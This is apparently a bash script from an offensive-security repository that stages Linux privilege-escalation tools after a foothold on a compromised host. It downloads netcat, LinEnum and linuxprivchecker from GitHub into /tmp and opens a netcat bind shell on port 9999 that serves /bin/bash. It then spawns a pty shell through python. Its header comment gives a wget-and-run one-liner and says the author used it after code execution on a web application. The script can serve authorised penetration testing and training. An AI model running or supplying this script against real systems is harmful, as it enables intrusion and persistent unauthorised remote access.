#!/bin/bash
# used to stage all appropriate tools needed for privesc + handles some base config setup
# use: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh
# (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)


# banner
echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
echo "[]_________________________________________________________________________________________[]"

# download NC
echo "[*] Downloading NC to: /tmp/ + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -O /tmp/nc && chmod +x /tmp/nc


# download linenum.sh
echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh


# download LinxPrivChecker.py
echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -O /tmp/LPC.py

# build a NC bind shell incase we lose a shell
echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
/tmp/nc -nlvp 9999 -e /bin/bash &
# chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
sleep 2s

# semi interactive shell
echo "[*] Attempting to build semi-interactive shell "
if command -v python &>/dev/null; then
    echo "-[*] Python availble, dropping semi-tty shell"
    python -c 'import pty;pty.spawn("/bin/bash");'
    
elif command -v python3 &>/dev/null; then
    echo "-[*] Python 3 availble, dropping semi-tty shell"
    python3 -c 'import pty;pty.spawn("/bin/bash");' 
    
else
    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method"
fi

echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"



